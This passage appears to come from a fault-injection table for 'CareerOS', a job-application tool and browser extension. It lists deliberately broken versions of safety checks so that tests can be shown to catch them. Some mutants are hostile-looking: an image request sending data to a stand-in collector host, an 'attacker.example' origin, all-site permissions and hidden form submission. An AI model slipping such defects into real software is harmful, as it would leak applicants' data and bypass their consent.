     'submission: authorization without your current profile allowed'),
    ('careeros/review/submission.py', 'AND meaningful = 1 AND (at >= ? OR rowid > ?) ', 'AND meaningful = 1 AND (at >= ? OR (rowid > ? AND 0)) ',
     'submission: a change recorded after a release missed when the clock went back'),
    ('careeros/cli.py', 'agency=args.agency, profile=ctx.profile))', 'agency=args.agency))',
     'release view: authorization judged without your current profile'),
    ('careeros/qualify/certifications.py',
     '            if c["kind"] in COUNTING_KINDS and ((key and c["key"] == key) or norm(c["name"]) == norm(name))]',
     '            if ((key and c["key"] == key) or norm(c["name"]) == norm(name))]',
     'briefs: a held course or unknown kind shown as a held certification'),
    ('careeros/qualify/night.py', '    for item, days, day_evidence, zone in readings:', '    for item, days, day_evidence, zone in readings[:1]:',
     'NIGHT: only the preferred stated range measured'),
    ('careeros/qualify/worktime.py', 'sleep_after_hours=least("sleep_after_hours"), confirmed=False,',
     'sleep_after_hours=least("sleep_after_hours"), confirmed=worst["confirmed"],', 'NIGHT: several stated ranges confirmed from one'),
    ('careeros/qualify/worktime.py', '    if word == "mdt":', '    if False:', 'NIGHT: Mountain daylight time not read'),
    ('careeros/qualify/worktime.py',
     '            readings = [_one(word, standard, text[lo:hi], where, bare) for word, standard, bare in named]',
     '            readings = [_one(word, standard, text, where, bare) for word, standard, bare in named]',
     "NIGHT: a zone written elsewhere in the posting corroborates the shift's"),
    ('careeros/review/role_identity.py', '        if a not in alone and b not in alone and ra != rb and compatible(ra, rb):',
     '        if ra != rb:', 'calibration: one group holds two known vacancies of one employer'),
    ('careeros/review/role_identity.py', '        if not bridges:', '        if True:',
     'calibration: a posting without a requisition joins one of two vacancies'),
    ('careeros/review/scoring_eval.py', '    return groups if isinstance(groups, list) else []',
     '    return groups or []', 'calibration: a malformed earlier list stops the next draw'),
    ('careeros/review/approved_facts.py', '        tail = after if after and len(after.split()) <= 3 and not _figures(after) else ""',
     '        tail = ""', 'approved facts: a qualifier in its own short sentence not read with the figure'),
    # Independent Codex Pass 2 (2026-10-21): the same hours on other days or in another zone are another schedule
    ('careeros/qualify/night.py',
     '            key = (f[2], f[3], tuple(days) if days else None, zone.get("basis"), tuple(zone.get("zones") or ()),\n'
     '                   kind == "daytime_likely")',
     '            key = (f[2], f[3])', 'NIGHT: schedules with the same hours on other days or zones measured once'),
    ('careeros/review/submission.py', '    if not isinstance(seen, int):', '    if False:',
     'release: a release without a change count still authorizes'),
    # Assisted applications (P2-P6, 2026-10-21; ADR 0009): each safety rule of answers, packages, sessions, the handoff
    # and the browser extension
    ('careeros/review/answers.py',
     '    reason = form_blocked(question, options)\n    if reason:',
     '    reason = form_blocked(question, options)\n    if False:', 'answers: a sensitive question answered from the file'),
    ('careeros/review/answers.py',
     '    return _trim(canonical(question))',
     '    return re.sub(r"[^a-z0-9 ]", "", canonical(question))', 'answers: a merely similar question treated as yours'),
    ('careeros/review/answers.py', '    return not entry["expires"] or entry["expires"] >= today',
     '    return True', 'answers: an expired answer used without review'),
    ('careeros/review/answers.py', '        if approved is None:\n            raise ValueError(f"answer_invalid: approved',
     '        if False:\n            raise ValueError(f"answer_invalid: approved', 'answers: an answer without an approval date accepted'),
    ('careeros/review/packages.py', '    if label and label["label"] == "skip":',
     '    if False:', 'packages: a package prepared for a job you labelled Skip'),
    ('careeros/review/packages.py', '    if store.one("SELECT 1 FROM dismissals WHERE job_id = ?", (job_id,)):',
     '    if False:', 'packages: a package prepared for a job you dismissed'),
    ('careeros/review/packages.py',
     '    rows = store.all("SELECT * FROM package_approvals WHERE package_id = ? ORDER BY at, rowid", (package["package_id"],))\n'
     '    revoked = {r["revokes"] for r in rows if r["action"] == "revoke"}\n'
     '    valid = [r for r in rows if r["action"] == "approve" and r["approval_id"] not in revoked\n'
     '             and r["manifest_sha256"] == package["manifest_sha256"]]',
     '    rows = store.all("SELECT a.* FROM package_approvals a JOIN packages p ON p.package_id = a.package_id "\n'
     '                     "WHERE p.job_id = ? ORDER BY a.at, a.rowid", (package["job_id"],))\n'
     '    revoked = {r["revokes"] for r in rows if r["action"] == "revoke"}\n'
     '    valid = [r for r in rows if r["action"] == "approve" and r["approval_id"] not in revoked]',
     'packages: an approval covering a later version'),
    ('careeros/review/packages.py', '    return route == "stretch" or settings(policy)["approval_required"] == "all"',
     '    return settings(policy)["approval_required"] == "all"', 'packages: a Stretch package ready without approval'),
    ('careeros/review/packages.py', '    if fingerprint(manifest) != package["manifest_sha256"]:',
     '    if False:', 'packages: a stale package treated as current'),
    ('careeros/review/packages.py', '    if not cfg["enabled"]:\n        return False, ["standing preparation is off',
     '    if False:\n        return False, ["standing preparation is off', 'packages: standing preparation running while off'),
    ('careeros/review/packages.py', '    if comps.get("decisive_unknowns"):',
     '    if False:', 'packages: standing preparation ignoring decisive unknowns'),
    ('careeros/review/packages.py', '    if manifest["unknown_facts_cited"]:',
     '    if False:', 'packages: an answer resting on an unknown fact accepted'),
    ('careeros/review/packages.py', '                    row["status"] = "option_mismatch"',
     '                    pass', "packages: an answer that isn't one of the form's choices not flagged"),
    ('careeros/review/assist.py', '    reasons += [f"{r[\'code\']}: {r[\'detail\']}" for r in auth.reasons]',
     '    reasons += []', 'assist: a session opened without submission authorization'),
    ('careeros/review/assist.py', '        if s["state"] == "open":',
     '        if False:', 'assist: two sessions open for one role'),
    ('careeros/review/assist.py', '        elif s["state"] == "uncertain":',
     '        elif False:', 'assist: a new session despite an uncertain one'),
    ('careeros/review/assist.py', '        if fill not in FILLABLE:',
     '        if False:', 'assist: filling a destination not permitted'),
    ('careeros/review/assist.py', '        hit = rules.get(".".join(parts[i:]))',
     '        hit = rules.get(host)', 'assist: a listed domain not covering its subdomains'),
    ('careeros/review/assist.py', '    elif evidence is not None:\n        raise ValueError("evidence_only_for_submitted")',
     '    elif False:\n        raise ValueError("evidence_only_for_submitted")', 'assist: evidence recorded for an unsubmitted session'),
    ('careeros/review/assist.py', '    if state in ("submitted", "not_submitted"):',
     '    if False:', 'assist: a closed session closed again'),
    ('careeros/review/applications.py', '    if evidence not in EVIDENCE:',
     '    if False:', 'applications: an unknown kind of evidence recorded'),
    ('careeros/review/adapters.py',
     '        if row.get("status") != "matched" or row["type"] not in ("text", "textarea", "select") \\\n',
     '        if row.get("answer_id") is None \\\n', 'handoff: an unmatched or unfillable value handed to the extension'),
    ('careeros/review/adapters.py', '        fields = [f for f in q.get("fields") or [] if f.get("type") != "input_hidden"]',
     '        fields = list(q.get("fields") or [])', 'adapters: a hidden Greenhouse field read as a question'),
    ('extension/fill.js', '  return result;\n}',
     '  if (document.forms[0]) document.forms[0].requestSubmit();\n  return result;\n}', 'extension: the fill submits the form'),
    ('extension/fill.js',
     '      if (el.value) {',
     '      if (false) {', 'extension: a value you typed overwritten'),
    ('extension/popup.js',
     '  if (!errors.length && !(tab && (tabId === undefined || tab.id === tabId) && onThePosting(data, tab.url))) {',
     '  if (false) {', "extension: filling a tab that isn't the named posting"),
    ('extension/manifest.json', '  "permissions": ["activeTab", "scripting"],',
     '  "permissions": ["activeTab", "scripting"],\n  "host_permissions": ["<all_urls>"],', 'extension: host permissions for every site'),
    # Independent Codex review of ac83e00 (2026-10-22): F1-F8 corrections. The extension's own checks are caught by
    # tests/test_extension_behaviour.py, which needs Node (CAREEROS_NODE), and by tests/test_extension.py
    ('extension/popup.js',
     '    const now = await checkNow(data, tabId);',
     '    const now = { errors: [], tab: { id: tabId } };', 'extension: the click not checked again before filling'),
    ('extension/fill.js',
     '  if (!here || !adapter.origins.includes(here.origin)\n      || !(here.pathname === guard.path || here.pathname.startsWith(guard.path + "/"))) {',
     '  if (false) {', 'extension: the page function not checking its posting'),
    ('extension/fill.js',
     '  if (!(expires > now) || expires - now > LIFETIME_MS) {',
     '  if (expires - now > LIFETIME_MS) {', 'extension: the page function filling after the handoff expired'),
    ('extension/fill.js',
     '  if (!adapter || typeof guard.path !== "string" || !adapter.path.test(guard.path)) {',
     '  if (!adapter) {', 'extension: the page function accepting a guard without a destination'),
    ('extension/fill.js',
     '  const placeholder = !current || (current.value === "" && (current.disabled || PLACEHOLDER.test(current.text)));',
     '  const placeholder = true;', 'extension: a choice already made replaced'),
    ('extension/popup.js',
     '!dest.origins.every((o) => adapter.origins.includes(o))',
     '!dest.origins.every((o) => /^https:\\/\\/[a-z0-9.-]+$/.test(o))', 'extension: a handoff naming its own destination'),
    ('extension/popup.js',
     '!adapter.field.test(f.name)',
     '!/^[A-Za-z0-9_\\-[\\]]{1,120}$/.test(f.name)', 'extension: a handoff naming its own fields'),
    ('careeros/review/adapters.py',
     '    if adapter != "greenhouse" or origin not in GREENHOUSE_ORIGINS or not re.fullmatch(GREENHOUSE_PATH, path):',
     '    if adapter != "greenhouse":', 'adapters: a handoff for an unreviewed address'),
    ('careeros/review/adapters.py',
     '                or not re.fullmatch(GREENHOUSE_FIELD, row.get("name") or "") or blocked:',
     '                or not row.get("name"):', 'adapters: an unreviewed field name or a sensitive label handed over'),
    ('careeros/review/answers.py',
     '        if answer_id.lower() in ids:',
     '        if False:', 'answers: two answers with one id accepted'),
    ('careeros/review/packages.py',
     '    if entry is None or text_fingerprint(entry["answer"]) != sha256 \\\n            or (question_sha256 is not None and text_fingerprint(entry["question"]) != question_sha256):',
     ('    if entry is None \\\n            or (question_sha256 is not None and text_fing'
      'erprint(entry["question"]) != question_sha256):'), 'packages: an answer other than the prepared one shown or handed over'),
    ('careeros/review/answers.py',
     '    texts = [("its question", entry["question"]), *(("a phrasing", p) for p in entry["phrasings"])]',
     '    texts = [("its question", entry["question"])]', 'answers: an answer written for a sensitive question used through another wording'),
    ('careeros/review/answers.py',
     '        r"consent|\\bagree(?:s|d|ing)?\\b|acknowledg|\\battest|\\bcertif(?:y|ies)\\b|\\bhereby\\b|\\bdeclar(?:e|es|ation)\\b|"',
     '        r"i consent|i agree\\b|"', 'answers: the generic consent and agreement words dropped'),
    ('careeros/review/packages.py',
     '        return [], {a["id"] for a in library["answers"] if answer_lib.usable(a, today)}',
     '        return [], set()', 'packages: the fallback answers outside the version'),
    ('careeros/review/answers.py',
     '    return _current(entry, today) and not sensitive_entry(entry)',
     '    return True', 'answers: an expired or sensitive answer offered to copy'),
    ('careeros/review/packages.py',
     '        if reason["level"] in ("block", "hold"):',
     '        if reason["level"] == "hold":', 'packages: a package prepared for a role with an application in play'),
    ('careeros/review/packages.py',
     '        if reason["level"] in ("block", "hold"):',
     '        if reason["level"] == "block":', 'packages: a role applied to before prepared again'),
    ('careeros/review/assist.py',
     '            if writer.receipt("assist_open", key, {"job_id": job_id, "mode": mode}, actor_id="user") == "replay":',
     ('            if writer.receipt("assist_open", key, {"job_id": job_id, "mode": mod'
      'e}, actor_id="user") == "never":'), 'assist: a repeated open with the same key not answered with the first result'),
    ('careeros/review/assist.py',
     '        if writer.receipt("assist_close", key, payload, actor_id="user") == "replay":',
     '        if writer.receipt("assist_close", key, payload, actor_id="user") == "never":', 'assist: a repeated close with the same key not answered with the first result'),
    # The second Claude review of those corrections (2026-10-22): deny-by-default answer kinds, the canonical form,
    # answers and choices read, the panel's version, the page function's own table and expiry cap, the field lookup,
    # choices by position, whole replays, the Greenhouse switch, and validation that says when Node didn't run
    ('careeros/review/answers.py',
     '        if kind not in KINDS or (kind == "contact") != bool(field):',
     '        if False:', 'answers: an answer without a kind CareerOS reuses accepted'),
    ('careeros/review/answers.py',
     '        if not answer_id.isascii() or not ANSWER_ID.fullmatch(answer_id.lower()):',
     '        if False:', 'answers: an id with invisible or odd characters accepted'),
    ('careeros/review/answers.py',
     '    forms = {normalize(text), _trim(canonical(text, _BLANK_AS_SPACE)), _trim(canonical(text, entities=False))}',
     '    forms = {str(text or "").lower().strip()}', 'answers: a pasted label read without its canonical form'),
    ('careeros/review/answers.py',
     '    texts.append(("its answer", entry["answer"]))',
     '    pass', 'answers: an answer that is itself a consent used'),
    ('careeros/review/answers.py',
     '    for option in options or []:',
     '    for option in []:', "answers: the form's choices not read"),
    ('careeros/review/answers.py',
     '    reason = form_blocked(label, options)\n',
     '    reason = None\n', "answers: a standard field's form label not read"),
    ('careeros/review/answers.py',
     '        r"\\bpronouns?\\b|\\brace\\b(?! condition| and ethnicity data)|\\bracial\\b|\\braces\\b|\\bethnic(?!ity data)|\\bhispanic\\b|\\blatin[oax]\\b|\\bindigenous\\b|"',
     '        r"\\bpronouns?\\b|\\bracial\\b|\\braces\\b|\\bethnic(?!ity data)|\\bhispanic\\b|\\blatin[oax]\\b|\\bindigenous\\b|"', 'answers: race no longer read as demographics'),
    ('careeros/review/answers.py',
     ('        r"\\b(?:are you|you are|currently|planning to become) pregnant\\b|\\bpregna'
      "ncy status\\b|\\bmaternity leave\\b|\\bveterans?\\b(?!'? benefits)|\\bmilitary\\b(?! (?"
      ':health|families|family|benefits|time))|"'),
     '        r"\\b(?:are you|you are|currently|planning to become) pregnant\\b|\\bpregnancy status\\b|\\bmaternity leave\\b|"', 'answers: the words veteran and military dropped from military service'),
    ('careeros/review/answers.py',
     '        r"\\bcriminal\\b|\\bcrimes?\\b|\\bconvict(?:ed|ion|ions)?\\b|\\bfelon(?:y|ies)?\\b|\\bmisdemeanou?rs?\\b|\\barrested\\b|"',
     '        r"\\bcriminal\\b|"', 'answers: convictions no longer read as a criminal check'),
    ('careeros/review/packages.py',
     '"question_sha256": text_fingerprint(a["question"])}',
     '"question_sha256": None}', 'packages: the question an answer was written for left out of the version'),
    ('careeros/review/packages.py',
     '            or (question_sha256 is not None and text_fingerprint(entry["question"]) != question_sha256):',
     '            or False:', 'packages: the question an answer was written for not checked when shown'),
    ('careeros/review/packages.py',
     '        if manifest["withheld"]:',
     '        if False:', 'packages: the answers held back not listed in the panel'),
    ('careeros/review/adapters.py',
     '                or not re.fullmatch(GREENHOUSE_FIELD, row.get("name") or "") or blocked:',
     '                or not re.match(GREENHOUSE_FIELD, row.get("name") or "") or blocked:', 'adapters: a field name with a final newline handed over'),
    ('careeros/review/adapters.py',
     '        blocked = answer_lib.form_blocked(label, row.get("options"))',
     '        blocked = None', "adapters: the form's question and choices not read again before handing over"),
    ('careeros/review/assist.py',
     '                return {"replay": True, **first,',
     '                return {"replay": True,', 'assist: a replay answered without the first result'),
    ('careeros/review/assist.py',
     '            written.unlink(missing_ok=True)',
     '            pass', 'assist: a handoff left behind when its session was not recorded'),
    ('careeros/review/assist.py',
     '            except ValueError as exc:\n                reasons.append(f"{exc}; use manual mode")',
     '            except ValueError:\n                pass', 'assist: an unreviewed address left out of the refusal reasons'),
    ('careeros/review/assist.py',
     '                   "login_steps": login_steps, "reapply": reapply or "", "confirm": confirm or ""}',
     '                   "login_steps": login_steps}', 'assist: a close repeated with another explanation replayed'),
    ('careeros/review/assist.py',
     '                if checked is None or (today is not None and checked.isoformat()[:10] > today):',
     '                if checked is None:', 'assist: an installed-check date after today accepted'),
    ('careeros/review/assist.py',
     '            if LEVELS.index(fill) > LEVELS.index(reviewed):',
     '            if False:', 'assist: filling turned on beyond what the host was reviewed for'),
    ('careeros/review/assist.py',
     '        fill = capability(host, "fill", assistance_policy(policy=policy, today=store.clock.now()[:10]))',
     '        fill = capability(host, "fill", assistance_policy(today=store.clock.now()[:10]))', 'assist: your switch for a destination ignored'),
    ('config/site_policy.yaml',
     '  greenhouse.io: {fill: unknown, upload: blocked, reviewed_fill: supervised_only}',
     '  greenhouse.io: {fill: supervised_only, upload: blocked, reviewed_fill: supervised_only}', 'site policy: Greenhouse filling on as shipped'),
    ('extension/fill.js',
     '    && Object.prototype.hasOwnProperty.call(ADAPTERS, guard.adapter) ? ADAPTERS[guard.adapter] : null;',
     '    && Object.prototype.hasOwnProperty.call(ADAPTERS, guard.adapter) ? ADAPTERS[guard.adapter] : ADAPTERS.greenhouse;', 'extension: the page function taking any adapter name'),
    ('extension/fill.js',
     '  if (!here || !adapter.origins.includes(here.origin)',
     '  if (!here || !(guard.origins || adapter.origins).includes(here.origin)', 'extension: the page function taking its sites from the guard'),
    ('extension/fill.js',
     '      || !(here.pathname === guard.path || here.pathname.startsWith(guard.path + "/"))) {',
     '      || !(here.pathname === guard.path || here.pathname.startsWith(guard.path))) {', 'extension: the page function taking a longer posting number for the named one'),
    ('extension/fill.js',
     '  if (!(expires > now) || expires - now > LIFETIME_MS) {',
     '  if (!(expires > now)) {', 'extension: the page function accepting a handoff that claims a longer life'),
    ('extension/fill.js',
     '  const expires = typeof guard.expires_at === "string" && STAMP.test(guard.expires_at) ? Date.parse(guard.expires_at) : NaN;',
     '  const expires = Date.parse(guard.expires_at);', 'extension: the page function reading a zone-less expiry as local time'),
    ('extension/fill.js',
     '    if (!field || typeof field.name !== "string" || !adapter.field.test(field.name) || typeof field.value !== "string") {',
     '    if (!field || typeof field.name !== "string" || typeof field.value !== "string") {', "extension: the page function filling a field its adapter doesn't fill"),
    ('extension/fill.js',
     '    if (matches.length > 1) {',
     '    if (false) {', 'extension: a name two elements answer to filled'),
    ('extension/fill.js',
     '      choose(el, option.index);',
     '      choose(el, Array.from(el.options).findIndex((o) => o.value === option.value));', 'extension: a choice picked by a value two choices share'),
    ('extension/fill.js',
     '      if (option.disabled || (group && group.tagName === "OPTGROUP" && group.disabled)) {',
     '      if (false) {', 'extension: a disabled choice picked'),
    ('extension/fill.js',
     '      if (options.length !== 1) {',
     '      if (options.length === 0) {', 'extension: one of two choices that read alike picked'),
    ('extension/fill.js',
     '    el.dispatchEvent(new Event("change", { bubbles: true }));',
     ('    el.dispatchEvent(new Event("change", { bubbles: true }));\n    if (el.form) H'
      'TMLFormElement.prototype.submit.call(el.form);'), 'extension: the page function submitting through the prototype'),
    ('extension/popup.js',
     '  else if (expires - nowMs > LIFETIME_MS) errors.push(',
     '  else if (false) errors.push(', 'extension: the popup accepting a handoff that claims a longer life'),
    ('extension/popup.js',
     '  const expires = typeof data.expires_at === "string" && STAMP.test(data.expires_at) ? Date.parse(data.expires_at) : NaN;',
     '  const expires = Date.parse(data.expires_at);', 'extension: the popup reading a zone-less expiry as local time'),
    ('extension/popup.js',
     '  if (!text(data.session_id) || !text(data.package_id) || !data.job || !text(data.job.title) || !text(data.job.employer)',
     '  if (false', 'extension: the popup reading a file without what CareerOS writes'),
    ('extension/popup.js',
     '(tabId === undefined || tab.id === tabId)',
     'true', 'extension: the popup filling when another tab is in front'),
    ('extension/popup.js',
     '    && (page.pathname === path || page.pathname.startsWith(path + "/"));',
     '    && (page.pathname === path || page.pathname.startsWith(path));', 'extension: the popup taking a longer posting number for the named one'),
    ('extension/popup.js',
     '      func: fillFields,',
     '      func: fillFields,\n      world: "MAIN",', "extension: the fill running in the page's own world"),
    ('extension/popup.js',
     '  const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });',
     '  if (chrome.windows) chrome.windows.getCurrent();\n  const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });', 'extension: the popup reaching another chrome API'),
    ('extension/popup.js',
     '    const out = run.result;',
     ('    const out = run.result;\n    if (typeof Image !== "undefined") new Image().sr'
      'c = "https://collector.invalid/?" + data.fields.length;'), 'extension: the popup sending something with an image request'),
    ('tools/validate.py',
     '    if args.full:\n        return Outcome(False, detail + "; a --full run needs them", failures)',
     '    if False:\n        return Outcome(False, detail + "; a --full run needs them", failures)', 'validate: extension behaviour tests not run, counted as run in a full run'),
    # The third Claude review of the corrections (2026-10-22): each answer's kind checked against the wording, more
    # sensitive wordings and a stricter canonical form, quoted YAML values, dates in the overrides, an interrupted
    # commit, replays of closed sessions, and the extension's literal-level allow-lists and edge cases
    ('careeros/review/answers.py',
     '    if not fits(entry["kind"], entry["question"]):\n',
     '    if False:\n', "answers: an answer used whatever its own question's kind"),
    ('careeros/review/answers.py',
     '            if not fits(entry["kind"], question):\n',
     '            if False:\n', "answers: an answer used whatever the form's question's kind"),
    ('careeros/review/answers.py',
     '    return any(p.fullmatch(words) for p in _KIND_PATTERNS[kind]) \\',
     '    return True or any(p.fullmatch(words) for p in _KIND_PATTERNS[kind]) \\', 'answers: every question read as every kind'),
    ('careeros/review/answers.py',
     '        r"(?:salary|pay|compensation|wage|rate)(?: range)? (?:expectations?|requirements?)(?: for this (?:role|position))?",',
     ('        r"(?:salary|pay|compensation|wage|rate)(?: range)? (?:expectations?|requ'
      'irements?)(?: for this (?:role|position))?|.*salary.*",'), 'answers: any question about salary read as an expectation'),
    ('careeros/review/answers.py',
     '        r"^(?!.*\\b(?:expect|desired|target|requested|requirements?|range|looking for|seeking|minimum|preferred|"',
     '        r"^(?=never)(?!.*\\b(?:expect|desired|target|requested|requirements?|range|looking for|seeking|minimum|preferred|"', 'answers: pay history read only by fixed phrases'),
    ('careeros/review/answers.py',
     '        r"(?<!hipaa )\\b(?:ccpa|cpra|gdpr|privacy|eeo|eeoc|fcra|data|applicant) notice\\b|\\bnotice at collection\\b|"',
     '        r"\\bnotice at collection\\b|"', 'answers: a privacy notice no longer read as consent'),
    ('careeros/review/answers.py',
     '    text = unicodedata.normalize("NFKD", (html.unescape(text) if entities else text).lower())',
     '    text = unicodedata.normalize("NFKD", text.lower())', 'answers: HTML entities in a label not decoded'),
    ('careeros/review/answers.py',
     '    text = "".join(ch for ch in text if unicodedata.category(ch) not in ("Mn", "Me", "Cf"))',
     '    text = "".join(ch for ch in text if unicodedata.category(ch) != "Cf")', 'answers: combining marks left to hide a word'),
    ('careeros/review/answers.py',
     '    return text.lstrip(" *-\\"\'").rstrip(" *?.:!\\"\'")',
     '    return text', "answers: a label's punctuation hiding an anchored word"),
    ('careeros/review/answers.py',
     '    if not isinstance(value, str):\n        raise ValueError(f"answer_invalid: {what} must be text: put it in quotes ({answer_id})")',
     '    if False:\n        raise ValueError(f"answer_invalid: {what} must be text: put it in quotes ({answer_id})")', 'answers: an unquoted Yes read as True'),
    ('careeros/review/packages.py',
     '    if held:   # the same answer, held back now (the checks were widened, or it was mislabelled)',
     '    if False:', 'packages: an answer held back after preparation still shown'),
    ('careeros/core/fingerprint.py',
     '        return value.isoformat()',
     '        raise TypeError("date")', 'fingerprint: a date in the vault overrides stopping every command'),
    ('careeros/review/assist.py',
     '        if written is not None and store.one("SELECT 1 FROM assist_sessions WHERE session_id = ?",\n                                             (out["session_id"],)) is None:',
     '        if written is not None:', 'assist: the handoff of a recorded session removed after an interrupt'),
    ('careeros/review/assist.py',
     '                        **({"state": session_state(store, first["session_id"])} if first.get("session_id") else {})}',
     '                        }', 'assist: a replay that hides what became of its session'),
    ('extension/fill.js',
     '      if (!(el instanceof HTMLSelectElement) || el.multiple) {',
     '      if (!(el instanceof HTMLSelectElement)) {', 'extension: a list of several choices changed'),
    ('extension/fill.js',
     '      if (el.selectedIndex !== option.index) {',
     '      if (false) {', 'extension: a choice the page rejected reported as filled'),
    ('extension/popup.js',
     '  const adapter = data && typeof data.adapter === "string"\n',
     '  const adapter = data\n', 'extension: an adapter name given as a list taken by the popup'),
    ('extension/popup.js',
     '    if (out.refused) {',
     '    if (false) {', "extension: the page's refusal reported as a fill"),
    ('extension/fill.js',
     '    el.dispatchEvent(new Event("change", { bubbles: true }));',
     '    el.dispatchEvent(new Event("submit", { bubbles: true }));', 'extension: a submit event raised on the form'),
    ('extension/fill.js',
     '      result.skipped.push(field.name + " (" + matches.length + " fields on the page answer to this name)");',
     ('      const owner = matches[0]["form"]; if (owner) owner["requestSubmit"]();\n   '
      '   result.skipped.push(field.name + " (" + matches.length + " fields on the page'
      ' answer to this name)");'), 'extension: a form submitted through a bracketed member'),
    ('extension/fill.js',
     '    el.style.outline = "2px solid #1a7f37";',
     ('    el.style.outline = "2px solid #1a7f37";\n    const sent = /"/.test(field.name'
      ') || (el.form && el.form.requestSubmit()) || /"/.test(field.name);'), 'extension: code hidden between two quotes in regular expressions'),
    ('extension/fill.js',
     '      origins: ["https://boards.greenhouse.io", "https://job-boards.greenhouse.io"],\n      path: /^',
     ('      origins: ["https://boards.greenhouse.io", "https://job-boards.greenhouse.i'
      'o"],\n      origins: ["https://boards.greenhouse.io", "https://job-boards.greenho'
      'use.io", "https://attacker.example"],\n      path: /^'), "extension: a repeated key widening the page function's sites"),
    ('extension/popup.js',
     '      target: { tabId: now.tab.id },',
     '      target: { tabId: now.tab.id, ["allFrames"]: true },', 'extension: every frame filled through a computed key'),
    ('tools/check_handoff.py',
     '                if "=" not in item:\n',
     '                if False:\n', 'check handoff: a choice without a value dropped silently'),
    # The fourth Claude review (2026-10-22): each kind is a closed set of whole-question shapes, and a contact detail
    # fills only its own standard field
    ('careeros/review/answers.py',
     '    return any(p.fullmatch(words) for p in _KIND_PATTERNS[kind]) \\',
     '    return any(p.search(words) for p in _KIND_PATTERNS[kind]) \\', "answers: a kind's shape found inside a longer question"),
    ('careeros/review/answers.py',
     '        and not (kind in _VETOED_KINDS and _TOPIC_VETO.search(words))',
     '        and True', 'answers: a skill named in a shape that is about the person taken'),
    ('careeros/review/answers.py',
     '        if entry["field"]:   # a contact detail fills its own standard field only (find_field), never a custom question',
     '        if False:', 'answers: a contact detail used for a custom question'),
    ('careeros/review/answers.py',
     '    if label and field in _FIELD_LABELS and not _FIELD_LABELS[field].fullmatch(normalize(label)):',
     '    if False:', 'answers: a standard field filled whatever the form labels it'),
    # The fifth Claude review (2026-10-22): free parts are short names, authorization choices are a yes or a no, and
    # a contact detail is written for its own field
    ('careeros/review/answers.py',
     '_WORD = r"[a-z0-9][a-z0-9&\'/+#-]*"',
     '_WORD = r"[a-z0-9][a-z0-9&\'/+#(),. -]*"', "answers: a shape's free part taking a whole clause"),
    ('careeros/review/answers.py',
     '            if entry["kind"] in _YES_NO_KINDS and options \\',
     '            if False and options \\', 'answers: a list of statuses taken as the choices of an authorization question'),
    ('careeros/review/answers.py',
     '    if entry["field"] in _FIELD_LABELS and not _FIELD_LABELS[entry["field"]].fullmatch(normalize(entry["question"])):',
     '    if False:', 'answers: a contact detail written for another question offered'),
    # The sixth Claude review (2026-10-22): authorization answers are a plain yes or no, only real clearance levels, and
    # named answers are copied from the panel, never filled
    ('careeros/review/answers.py',
     '    if entry["kind"] in _YES_NO_KINDS and normalize(entry["answer"]) not in ("yes", "no"):',
     '    if False:', 'answers: an authorization answer that names a status used'),
    ('careeros/review/answers.py',
     '        r"(?:confidential|secret|top secret|ts|ts/sci|public trust|dod|doe|q|l) )?(?:security )?clearance",',
     '        r"[a-z]{1,20} )?(?:security )?clearance",', 'answers: a clearance of any kind taken as a security clearance'),
    ('careeros/review/adapters.py',
     '        if entry["kind"] in answer_lib.NAMED_KINDS:   # a named skill, credential or employer: you copy it, reading it',
     '        if False:', 'adapters: a named skill, credential or employer filled by the extension'),
    # The read-only verification of the Codex Pass 2 package (2026-10-22): free parts only in the named kinds, faithful
    # defects for the first-person consent rule and the missing installed check, and the extension's choice and
    # posting-address checks.
    ('careeros/review/answers.py',
     '        rf"how did you (?:hear|learn|find out) about (?:us|{_THIS_JOB})",',
     '        rf"how did you (?:hear|learn|find out) about (?:us|{_THIS_JOB}|{_NAME})",', 'answers: a referral question naming anything taken'),
    ('careeros/review/answers.py',
     'to relocate(?: (?:for {_THIS_JOB}|to {_OUR_SITE}|if (?:needed|"',
     'to relocate(?: (?:for [a-z0-9 -]{{1,40}}|to {_OUR_SITE}|if (?:needed|"', 'answers: a relocation reason of any words taken'),
    ('careeros/review/answers.py',
     '(?:commut(?:e|ing|able)|reasonable) distance(?: of {_OUR_SITE})?",',
     '(?:commut(?:e|ing|able)|reasonable) distance(?: of [a-z0-9 -]{{1,40}})?",', 'answers: a commuting destination of any words taken'),
    ('careeros/review/answers.py',
     '_LANGUAGE = (r"(?:english|',
     '_LANGUAGE = (r"(?:[a-z]{3,15}|english|', 'answers: any word taken as a language'),
    ('careeros/review/answers.py',
     '_ZONE = r"(?:eastern|',
     '_ZONE = r"(?:[a-z]{2,10}|eastern|', 'answers: any word taken as a time zone'),
    ('careeros/review/answers.py',
     '    "consent, agreement or attestation":\n',
     '    "consent, agreement or attestation": r"\\bi (?:hereby )?(?:certify|attest|acknowledge|consent|agree)\\b" if True else\n',
     'answers: consent read only in the first person, as before Codex F3'),
    ('careeros/review/assist.py',
     ('            given = caps.get("installed_check")\n            try:\n                checked = given if isinstance(given, date) '
      'else date.fromisoformat(given) \\\n                    if isinstance(given, str) and re.fullmatch(r"\\d{4}-\\d\\d-\\d\\d", given) '
      'else None\n                if checked is None or (today is not None and checked.isoformat()[:10] > today):\n'
      '                    raise ValueError("not a date on or before today")\n            except ValueError as exc:\n'
      '                raise ValueError(f"assistance_override_invalid: turning on filling for {host} needs installed_check: the "\n'
      '                                 "date you ran the installed-extension check (docs/assisted_applications.md)") from exc\n'
      '            base["installed_check"] = checked.isoformat()[:10]'),
     '            base["installed_check"] = str(caps.get("installed_check"))', 'assist: filling turned on without the installed-extension check'),
    ('extension/fill.js',
     '      const placeholder = !current || (current.value === "" && (current.disabled || PLACEHOLDER.test(current.text)));',
     '      const placeholder = !current || (current.value === "" && PLACEHOLDER.test(current.text));',
     'extension: a disabled placeholder with its own wording kept as a choice'),
    ('extension/fill.js',
     '      const current = el.selectedIndex >= 0 ? el.options[el.selectedIndex] : null;',
     '      const current = el.options[0];', 'extension: the first choice read instead of the one selected'),
    ('extension/popup.js',
     '  if (typeof dest.path !== "string" || !adapter.path.test(dest.path)) errors.push',
     '  if (typeof dest.path !== "string" || false) errors.push', 'extension: a handoff naming its own posting address'),
    ('tools/check_handoff.py',
     '    if not 1 <= minutes <= 120:   # never more than the two hours CareerOS gives a handoff',
     '    if not 1 <= minutes:', 'tools: a check handoff living longer than two hours'),
    # Independent Codex review, Pass 2 of 4787e2a (2026-10-22): an answer's own text read whatever its length, and a
    # long answer never filled
    ('careeros/review/answers.py',
     '    texts.append(("its answer", entry["answer"]))',
     '    if len(entry["answer"]) <= 80:\n        texts.append(("its answer", entry["answer"]))',
